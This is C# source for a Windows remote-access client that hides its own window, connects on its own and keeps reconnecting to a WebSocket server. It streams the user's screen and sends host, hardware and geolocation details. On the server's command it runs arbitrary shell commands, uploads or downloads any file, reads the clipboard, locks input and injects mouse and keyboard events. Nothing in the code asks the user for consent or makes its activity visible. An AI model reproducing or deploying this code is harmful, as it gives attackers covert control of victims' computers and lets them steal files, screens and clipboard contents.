namespace CSharpSender;

public partial class Form1 : Form
{
    private System.Net.WebSockets.ClientWebSocket? ws;
    private System.Threading.CancellationTokenSource? cts;
    private System.Windows.Forms.Timer timer;
    private System.Windows.Forms.Timer telemetryTimer;
    private int _jpegQuality = 85;                    // MUCH BETTER QUALITY (was 55)
    private int _captureWidth = 1920;                  // FULL HD RESOLUTION (was 800)
    private int _captureHeight = 1080;                 // FULL HD RESOLUTION (was 600)
    private volatile bool _sendingFrame = false;
    private Task? _listenTask;
    private readonly System.Threading.SemaphoreSlim _wsSendLock = new System.Threading.SemaphoreSlim(1, 1);

    private async Task SafeSendAsync(ArraySegment<byte> buffer, System.Net.WebSockets.WebSocketMessageType messageType, bool endOfMessage, System.Threading.CancellationToken token)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open) return;
        await _wsSendLock.WaitAsync(token);
        try 
        {
            if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open) 
            {
                await ws.SendAsync(buffer, messageType, endOfMessage, token);
            }
        } 
        finally 
        {
            _wsSendLock.Release();
        }
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    public Form1()
    {
        InitializeComponent();
        txtWebSocket.Text = BuildConfig.DefaultWsUrl;
        txtRoomId.Text    = BuildConfig.DefaultRoomId;
        txtSecret.Text    = BuildConfig.DefaultSecret;
        
        btnStart.Click += BtnStart_Click;
        btnStop.Click += BtnStop_Click;
        timer = new System.Windows.Forms.Timer();
        timer.Interval = 33;                    // 30 FPS (was 200 for 5 FPS!)
        timer.Tick += Timer_Tick;
        telemetryTimer = new System.Windows.Forms.Timer();
        telemetryTimer.Interval = 5000;
        telemetryTimer.Tick += TelemetryTimer_Tick;
        btnStop.Enabled = false;

        // Automatically start the connection process safely after handle is created
        this.HandleCreated += (s, e) => {
             BtnStart_Click(null, null);
        };
    }

    protected override void SetVisibleCore(bool value)
    {
        // Prevent the form from ever becoming visible
        if (!this.IsHandleCreated) CreateHandle();
        base.SetVisibleCore(false);
    }



    // ...existing code...

    private async void BtnStop_Click(object? sender, EventArgs? e)
    {
        btnStart.Enabled = false;
        btnStop.Enabled = false;
        lblStatus.Text = "Status: Stopping...";
        
        try
        {
            timer.Stop();
            telemetryTimer.Stop();
            InputLockHelper.SetLock(false);
            
            if (cts != null && !cts.IsCancellationRequested)
            {
                cts.Cancel();
            }
            
            if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open)
            {
                try
                {
                    using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(3)))
                    {
                        await ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "Stop", timeoutCts.Token);
                    }
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Close timeout, disposing socket.");
                }
            }
            
            // Wait for listen task to complete (with timeout)
            if (_listenTask != null && !_listenTask.IsCompleted)
            {
                try
                {
                    using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(2)))
                    {
                        await _listenTask.ConfigureAwait(false);
                    }
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Listen task did not complete in time.");
                }
                catch (Exception ex)
                {
                    ExitForm.Log($"Listen task error: {ex.Message}");
                }
            }
            
            ws?.Dispose();
            ws = null;
            cts?.Dispose();
            cts = null;
            _listenTask = null;
            
            ExitForm.Log("Stopped.");
            lblStatus.Text = "Status: Idle";
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Stop error: {ex.Message}");
            lblStatus.Text = "Status: Error during stop";
        }
        finally
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }
    }

    private async void Timer_Tick(object? sender, EventArgs? e)
    {
        // Skip if already sending a frame (backpressure guard)
        if (_sendingFrame || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
            return;
        
        _sendingFrame = true;
        try
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            using (var bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height))
            {
                using (var g = System.Drawing.Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                using (var resized = new System.Drawing.Bitmap(_captureWidth, _captureHeight))
                {
                    using (var g2 = System.Drawing.Graphics.FromImage(resized))
                    {
                        g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                        g2.DrawImage(bmp, 0, 0, _captureWidth, _captureHeight);
                    }
                    using (var ms = new System.IO.MemoryStream())
                    {
                        var encoder = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
                            .FirstOrDefault(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
                        if (encoder != null)
                        {
                            var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
                            encoderParams.Param[0] = new System.Drawing.Imaging.EncoderParameter(
                                System.Drawing.Imaging.Encoder.Quality, (long)_jpegQuality);
                            resized.Save(ms, encoder, encoderParams);
                        }
                        else
                            resized.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        var buffer = ms.ToArray();
                        if (buffer.Length > 0)
                        {
                            var segment = new ArraySegment<byte>(buffer);
                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Binary, true, cts.Token);
                        }
                    }
                }
            }
        }
        catch (OperationCanceledException)
        {
            // Socket cancelled, the main reconnect loop will handle this
        }
        catch (ObjectDisposedException)
        {
            // WebSocket was disposed, wait for main loop to reconnect
        }
        catch (Exception ex)
        {
            // Log but NEVER stop the timer.
            // If the user runs this on a VPS and closes RDP, the screen locks and CopyFromScreen throws an exception.
            // We must keep ticking so that when they reconnect to RDP, the stream instantly restores itself!
            ExitForm.Log($"Frame send error: {ex.Message}");
        }
        finally
        {
            _sendingFrame = false;
        }
    }

    private string? _cachedCpuName;
    private string? _cachedGpuName;
    private string? _cachedWindowsVersion;
    private string? _geoCountryCode;
    private string? _geoCountry;
    private string? _geoCity;

    private async Task FetchGeoAsync()
    {
        try
        {
            using var client = new System.Net.Http.HttpClient();
            client.Timeout = TimeSpan.FromSeconds(5);
            var json = await client.GetStringAsync("http://ip-api.com/json/");
            using var doc = System.Text.Json.JsonDocument.Parse(json);
            var root = doc.RootElement;
            _geoCountryCode = root.TryGetProperty("countryCode", out var cc) ? cc.GetString() : null;
            _geoCountry     = root.TryGetProperty("country",     out var cn) ? cn.GetString() : null;
            _geoCity        = root.TryGetProperty("city",        out var ci) ? ci.GetString() : null;
            ExitForm.Log($"Geo: {_geoCity}, {_geoCountry} ({_geoCountryCode})");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Geo lookup failed: {ex.Message}");
        }
    }

    private string GetWmiString(string wmiClass, string property)
    {
        try
        {
            using var searcher = new System.Management.ManagementObjectSearcher($"SELECT {property} FROM {wmiClass}");
            foreach (var obj in searcher.Get())
            {
                var val = obj[property]?.ToString();
                if (!string.IsNullOrWhiteSpace(val))
                    return val.Trim();
            }
        }
        catch { }
        return "Unknown";
    }

    private async void TelemetryTimer_Tick(object? sender, EventArgs? e)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null)
            return;
        try
        {
            _cachedCpuName ??= GetWmiString("Win32_Processor", "Name");
            _cachedGpuName ??= GetWmiString("Win32_VideoController", "Name");
            _cachedWindowsVersion ??= GetWmiString("Win32_OperatingSystem", "Caption");

            var mem = new MEMORYSTATUSEX { dwLength = (uint)System.Runtime.InteropServices.Marshal.SizeOf<MEMORYSTATUSEX>() };
            GlobalMemoryStatusEx(ref mem);
            long totalMb = (long)(mem.ullTotalPhys / 1048576);
            long usedMb = (long)((mem.ullTotalPhys - mem.ullAvailPhys) / 1048576);
            int memPercent = (int)mem.dwMemoryLoad;

            var uptimeSeconds = Environment.TickCount64 / 1000;
            var uptimeStr = TimeSpan.FromSeconds(uptimeSeconds).ToString(@"d\.hh\:mm\:ss");
            var arch = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString();

            var summary = $"Hostname:  {Environment.MachineName}\n"
                + $"Windows:   {_cachedWindowsVersion}\n"
                + $"Arch:      {arch}\n"
                + $"CPU:       {_cachedCpuName}  ({Environment.ProcessorCount} cores)\n"
                + $"GPU:       {_cachedGpuName}\n"
                + $"Memory:    {usedMb:N0} MB / {totalMb:N0} MB  ({memPercent}%)\n"
                + $"Uptime:    {uptimeStr}";

            var payload = new Dictionary<string, object?>
            {
                ["type"] = "system-info",
                ["info"] = new Dictionary<string, object?>
                {
                    ["hostname"] = Environment.MachineName,
                    ["windowsVersion"] = _cachedWindowsVersion,
                    ["arch"] = arch,
                    ["cpuName"] = _cachedCpuName,
                    ["cpuCores"] = Environment.ProcessorCount,
                    ["gpuName"] = _cachedGpuName,
                    ["memoryPercent"] = memPercent,
                    ["usedMemMb"] = usedMb,
                    ["totalMemMb"] = totalMb,
                    ["uptimeSeconds"] = uptimeSeconds,
                    ["summary"] = summary,
                    ["countryCode"] = _geoCountryCode,
                    ["country"] = _geoCountry,
                    ["city"] = _geoCity
                }
            };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Telemetry send error: {ex.Message}");
        }
    }

    private async Task ListenForMessagesAsync()
    {
        var buffer = new byte[65536];
        var messageBuffer = new System.IO.MemoryStream();
        try
        {
            while (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open && cts != null && !cts.IsCancellationRequested)
            {
                messageBuffer.SetLength(0);
                System.Net.WebSockets.WebSocketReceiveResult result;
                try
                {
                    do
                    {
                        result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), cts.Token);
                        if (result.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                        {
                            ExitForm.Log("Server closed connection.");
                            return;
                        }
                        messageBuffer.Write(buffer, 0, result.Count);
                    } while (!result.EndOfMessage);
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Listen task cancelled.");
                    return;
                }

                var msg = System.Text.Encoding.UTF8.GetString(messageBuffer.GetBuffer(), 0, (int)messageBuffer.Length);
                try
                {
                    using var doc = System.Text.Json.JsonDocument.Parse(msg);
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("type", out var typeElem))
                        continue;
                    var type = typeElem.GetString();

                    // ── stream-quality ──
                    if (type == "stream-quality")
                    {
                        ApplyStreamQuality(root);
                        continue;
                    }

                    // ── chat-message ──
                    if (type == "chat-message")
                    {
                        var senderName = root.TryGetProperty("senderName", out var sn) ? sn.GetString() : "Unknown";
                        var message = root.TryGetProperty("message", out var m) ? m.GetString() : "";
                        ExitForm.Log($"[CHAT] {senderName}: {message}");
                        continue;
                    }

                    // ── chat-close ──
                    if (type == "chat-close")
                    {
                        var senderName = root.TryGetProperty("senderName", out var sn) ? sn.GetString() : "Unknown";
                        ExitForm.Log($"[CHAT] {senderName} closed chat.");
                        continue;
                    }

                    // ── motd ──
                    if (type == "motd")
                    {
                        var motdMsg = root.TryGetProperty("message", out var mm) ? mm.GetString() : "";
                        ExitForm.Log($"[MOTD] {motdMsg}");
                        continue;
                    }

                    // ── remote-control ──
                    if (type == "remote-control" && root.TryGetProperty("action", out var actionElem))
                    {
                        var action = actionElem.GetString();
                        if (action == "lock-input")
                        {
                            var locked = root.TryGetProperty("locked", out var le) && le.GetBoolean();
                            this.Invoke(() => InputLockHelper.SetLock(locked));
                            continue;
                        }
                        if (action == "file-list")
                        {
                            string dir = Environment.CurrentDirectory;
                            if (root.TryGetProperty("path", out var pathElem))
                            {
                                var requestedPath = pathElem.GetString();
                                if (!string.IsNullOrEmpty(requestedPath))
                                    dir = requestedPath;
                            }
                            string[] files = Array.Empty<string>();
                            string[] dirs = Array.Empty<string>();
                            if (System.IO.Directory.Exists(dir))
                            {
                                try { files = System.IO.Directory.GetFiles(dir); } catch { files = Array.Empty<string>(); }
                                try { dirs = System.IO.Directory.GetDirectories(dir); } catch { dirs = Array.Empty<string>(); }
                            }
                            files = files.Select(f => System.IO.Path.GetFileName(f)).ToArray();
                            dirs = dirs.Select(d => System.IO.Path.GetFileName(d)).ToArray();
                            var payload = new {
                                type = "file-list",
                                path = dir,
                                files = files,
                                directories = dirs
                            };
                            var json = System.Text.Json.JsonSerializer.Serialize(payload);
                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                        }
                        else if (action == "file-upload")
                        {
                            await HandleFileUpload(root);
                        }
                        else if (action == "file-download")
                        {
                            await HandleFileDownload(root);
                        }
                        else if (action == "execute-command")
                        {
                            await HandleExecuteCommand(root);
                        }
                        else if (action == "clipboard-get")
                        {
                            await HandleClipboardGet(root);
                        }
                        else
                        {
                            HandleRemoteControl(root, action);
                        }
                    }
                }
                catch (System.Text.Json.JsonException)
                {
                    // Ignore JSON parse errors
                }
                catch (Exception ex)
                {
                    ExitForm.Log($"Message handling error: {ex.Message}");
                }
            }
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Listen loop error: {ex.Message}");
        }
        finally
        {
            messageBuffer?.Dispose();
        }
    }

    private async Task HandleFileUpload(System.Text.Json.JsonElement root)
    {
        try
        {
            var remotePath = root.TryGetProperty("remotePath", out var rp) ? rp.GetString() : null;
            var fileName = root.TryGetProperty("fileName", out var fn) ? fn.GetString() : null;
            var dataB64 = root.TryGetProperty("data", out var d) ? d.GetString() : null;

            if (string.IsNullOrEmpty(dataB64))
            {
                ExitForm.Log("file-upload: no data received");
                return;
            }

            string savePath;
            if (!string.IsNullOrEmpty(remotePath))
                savePath = remotePath;
            else if (!string.IsNullOrEmpty(fileName))
                savePath = System.IO.Path.Combine(Environment.CurrentDirectory, fileName);
            else
            {
                ExitForm.Log("file-upload: no remotePath or fileName");
                return;
            }

            var dir = System.IO.Path.GetDirectoryName(savePath);
            if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
                System.IO.Directory.CreateDirectory(dir);

            var bytes = Convert.FromBase64String(dataB64);
            await System.IO.File.WriteAllBytesAsync(savePath, bytes, cts.Token);
            ExitForm.Log($"file-upload: saved {bytes.Length} bytes to {savePath}");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"file-upload error: {ex.Message}");
        }
    }

    private async Task HandleFileDownload(System.Text.Json.JsonElement root)
    {
        try
        {
            var filePath = root.TryGetProperty("path", out var p) ? p.GetString() : null;
            var fileName = root.TryGetProperty("fileName", out var fn) ? fn.GetString() : null;
            var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;

            if (string.IsNullOrEmpty(filePath))
            {
                ExitForm.Log("file-download: no path specified");
                return;
            }

            if (!System.IO.File.Exists(filePath))
            {
                ExitForm.Log($"file-download: file not found: {filePath}");
                return;
            }

            var bytes = await System.IO.File.ReadAllBytesAsync(filePath, cts.Token);
            var encoded = Convert.ToBase64String(bytes);
            var payloadDict = new Dictionary<string, object?>
            {
                ["type"] = "file-data",
                ["fileName"] = fileName ?? System.IO.Path.GetFileName(filePath),
                ["data"] = encoded,
                ["requestId"] = requestId
            };
            var json = System.Text.Json.JsonSerializer.Serialize(payloadDict);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
            ExitForm.Log($"file-download: sent {bytes.Length} bytes for {filePath}");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"file-download error: {ex.Message}");
        }
    }

    private Task HandleExecuteCommand(System.Text.Json.JsonElement root)
    {
        var command = root.TryGetProperty("command", out var ce) ? ce.GetString() : null;
        var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;

        if (string.IsNullOrEmpty(command))
        {
            // Nothing to do — don't await, return completed
            return string.IsNullOrEmpty(requestId)
                ? Task.CompletedTask
                : SendCommandOutput(requestId, "Error: no command specified");
        }

        // Fire-and-forget shortcut (no requestId) — launch detached, never block
        if (string.IsNullOrEmpty(requestId))
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("cmd")
                {
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                var proc = System.Diagnostics.Process.Start(psi);
                // Don't wait for output, just let it run detached
                if (proc != null)
                {
                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            await proc.WaitForExitAsync();
                            proc.Dispose();
                        }
                        catch { /* Ignore disposal errors */ }
                    });
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"execute-command (detached) error: {ex.Message}");
            }
            return Task.CompletedTask;
        }

        // Output-capturing command — run entirely off the receive loop so it never blocks
        var capturedRequestId = requestId;
        var capturedCommand = command;
        _ = Task.Run(async () =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("cmd")
                {
                    Arguments = $"/c {capturedCommand}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using var proc = System.Diagnostics.Process.Start(psi);
                if (proc == null)
                {
                    await SendCommandOutput(capturedRequestId, "Error: failed to start process");
                    return;
                }
                // Read with a 30-second timeout so a hung process can't block forever
                using var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(30));
                using var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(
                    cts?.Token ?? System.Threading.CancellationToken.None, timeoutCts.Token);
                try
                {
                    var stdout = await proc.StandardOutput.ReadToEndAsync(linked.Token);
                    var stderr = await proc.StandardError.ReadToEndAsync(linked.Token);
                    await proc.WaitForExitAsync(linked.Token);
                    var output = stdout;
                    if (!string.IsNullOrEmpty(stderr)) output += "\n[stderr]\n" + stderr;
                    if (string.IsNullOrEmpty(output)) output = $"(exit code {proc.ExitCode})";
                    await SendCommandOutput(capturedRequestId, output);
                }
                catch (OperationCanceledException)
                {
                    try { proc.Kill(true); } catch { }
                    await SendCommandOutput(capturedRequestId, "Error: command timed out (30s limit)");
                }
            }
            catch (Exception ex)
            {
                await SendCommandOutput(capturedRequestId, $"Error: {ex.Message}");
            }
        });

        // Return immediately so the receive loop continues
        return Task.CompletedTask;
    }

    private async Task SendCommandOutput(string? requestId, string output)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null) return;
        try
        {
            var payload = new Dictionary<string, object?> { ["type"] = "command-output", ["requestId"] = requestId, ["output"] = output };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
        }
        catch (Exception ex) { ExitForm.Log($"command-output send error: {ex.Message}"); }
    }

    private async Task HandleClipboardGet(System.Text.Json.JsonElement root)
    {
        try
        {
            var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;
            var text = "";
            this.Invoke(() =>
            {
                try { text = Clipboard.GetText() ?? ""; }
                catch { text = ""; }
            });
            if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null) return;
            var payload = new Dictionary<string, object?> { ["type"] = "clipboard-content", ["requestId"] = requestId, ["text"] = text };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
        }
        catch (Exception ex)
        {
            ExitForm.Log($"clipboard-get error: {ex.Message}");
        }
    }


    private void ApplyStreamQuality(System.Text.Json.JsonElement root)
    {
        var level = root.TryGetProperty("qualityLevel", out var ql) ? ql.GetString()?.ToLowerInvariant() : null;
        var jpeg = root.TryGetProperty("jpegQuality", out var jq) && jq.TryGetInt32(out var jv) ? jv : 85;
        _jpegQuality = Math.Clamp(jpeg, 10, 100);
        switch (level)
        {
            case "low":
                timer.Interval = 100;                    // 10 FPS
                _captureWidth = 1280;                      // HD
                _captureHeight = 720;
                break;
            case "high":
                timer.Interval = 33;                     // 30 FPS
                _captureWidth = 1920;                      // Full HD
                _captureHeight = 1080;
                break;
            default:
                timer.Interval = 33;                     // 30 FPS
                _captureWidth = 1920;                      // Full HD
                _captureHeight = 1080;
                break;
        }
    }

    private static void HandleRemoteControl(System.Text.Json.JsonElement root, string? action)
    {
        double xNorm = root.TryGetProperty("xNorm", out var xn) && xn.TryGetDouble(out var xv) ? xv : 0.5;
        double yNorm = root.TryGetProperty("yNorm", out var yn) && yn.TryGetDouble(out var yv) ? yv : 0.5;
        string button = root.TryGetProperty("button", out var be) ? (be.GetString() ?? "left") : "left";
        int delta = root.TryGetProperty("delta", out var de) && de.TryGetInt32(out var dv) ? dv : 120;
        string? key = root.TryGetProperty("key", out var ke) ? ke.GetString() : null;
        int keyCode = root.TryGetProperty("keyCode", out var kce) && kce.TryGetInt32(out var kcv) ? kcv : 0;

        try
        {
            switch (action)
            {
                case "mouse-down":
                    InputHelper.MouseDown(xNorm, yNorm, button);
                    break;
                case "mouse-up":
                    InputHelper.MouseUp(xNorm, yNorm, button);
                    break;
                case "mouse-move":
                    InputHelper.MouseMove(xNorm, yNorm);
                    break;
                case "mouse-wheel":
                    InputHelper.MouseWheel(xNorm, yNorm, delta);
                    break;
                case "key-press":
                    var vkPress = InputHelper.QtKeyToVk(keyCode, key);
                    if (vkPress.HasValue)
                        InputHelper.KeyPress(vkPress.Value);
                    break;
                case "key-release":
                    var vkRelease = InputHelper.QtKeyToVk(keyCode, key);
                    if (vkRelease.HasValue)
                        InputHelper.KeyRelease(vkRelease.Value);
                    break;
                case "mouse_left":
                    InputHelper.MouseDown(0.5, 0.5, "left");
                    InputHelper.MouseUp(0.5, 0.5, "left");
                    break;
                case "mouse_right":
                    InputHelper.MouseDown(0.5, 0.5, "right");
                    InputHelper.MouseUp(0.5, 0.5, "right");
                    break;
                case "mouse_center":
                    InputHelper.MouseMove(0.5, 0.5);
                    break;
            }
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Input error ({action}): {ex.Message}");
        }
    }

    private async void BtnStart_Click(object? sender, EventArgs? e)
    {
        var url = (txtWebSocket.Text ?? "").Trim();
        if (string.IsNullOrEmpty(url)) return;

        btnStart.Enabled = false;

        // Infinite reconnect loop
        while (true)
        {
            lblStatus.Text = "Status: Connecting to " + url + " ...";
            cts = new System.Threading.CancellationTokenSource();
            ws = new System.Net.WebSockets.ClientWebSocket();
            
            try
            {
                using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(15)))
                {
                    using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
                    {
                        await ws.ConnectAsync(new Uri(url), linked.Token);
                    }
                }
                lblStatus.Text = "Status: Joining room...";

                var machineId = Environment.MachineName ?? "CSharpSender";
                var roomId = (txtRoomId?.Text ?? "").Trim();
                var secret = (txtSecret?.Text ?? "").Trim();
                if (string.IsNullOrEmpty(roomId)) roomId = "ops-room";
                if (string.IsNullOrEmpty(secret)) secret = "boi123";
                var join = new Dictionary<string, object>
                {
                    ["type"] = "join",
                    ["role"] = "sender",
                    ["roomId"] = roomId,
                    ["secret"] = secret,
                    ["machineId"] = machineId
                };
                var joinJson = System.Text.Json.JsonSerializer.Serialize(join);
                var joinBytes = System.Text.Encoding.UTF8.GetBytes(joinJson);
                await SafeSendAsync(new ArraySegment<byte>(joinBytes), System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);

                var replyBuffer = new byte[4096];
                var replyResult = await ws.ReceiveAsync(new ArraySegment<byte>(replyBuffer), cts.Token);
                
                if (replyResult.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                {
                    // Server gracefully closed immediately during join
                    throw new Exception("Server closed connection during handshake.");
                }
                
                var replyJson = System.Text.Encoding.UTF8.GetString(replyBuffer, 0, replyResult.Count);
                using (var doc = System.Text.Json.JsonDocument.Parse(replyJson))
                {
                    var type = doc.RootElement.GetProperty("type").GetString();
                    if (type == "error")
                    {
                        var msg = doc.RootElement.TryGetProperty("message", out var m) ? m.GetString() : "Join failed";
                        throw new Exception($"Join failed: {msg}");
                    }
                }

                lblStatus.Text = "Status: Streaming";
                _ = FetchGeoAsync();
                timer.Start();
                telemetryTimer.Start();
                
                // Blocks here continuously processing messages until the socket breaks or is closed
                _listenTask = ListenForMessagesAsync();
                await _listenTask;
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Connection dropped or failed: {ex.Message}");
            }
            finally
            {
                // Clean up the broken state cleanly
                timer.Stop();
                telemetryTimer.Stop();
                InputLockHelper.SetLock(false);
                
                // Cancel pending reads/writes FIRST to release SemaphoreSlim deadlocks instantly
                try { cts?.Cancel(); } catch { }
                
                // Try a polite close with a strict timeout, otherwise just abort
                if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open)
                {
                    try 
                    { 
                        using var timeoutCts = new System.Threading.CancellationTokenSource(2000);
                        await ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "Restarting", timeoutCts.Token); 
                    } 
                    catch { }
                }
                
                try { ws?.Abort(); } catch { }
                ws?.Dispose();
                ws = null;
                
                try { cts?.Dispose(); } catch { }
                cts = null;
                _listenTask = null;
            }

            // Sleep 5 seconds before trying to auto-reconnect
            lblStatus.Text = "Status: Reconnecting in 5s...";
            await Task.Delay(5000);
        }
    }
}
